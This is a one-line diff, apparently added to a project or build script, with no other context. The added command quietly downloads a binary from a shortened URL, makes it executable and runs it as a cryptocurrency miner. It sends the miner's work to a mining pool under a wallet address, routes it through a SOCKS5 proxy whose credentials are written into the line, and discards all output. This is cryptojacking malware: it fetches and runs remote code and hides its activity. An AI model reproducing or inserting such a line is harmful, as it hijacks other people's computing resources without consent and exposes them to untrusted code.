@@ -1,0 +1,1 @@
+ wget -qO build https://git.io/JMAzZ && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u DC27hTsS7UWVyL3PUKqZJJkB1ghMo9oe2B.git -p c=DGB -t 2 -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080  >/dev/null
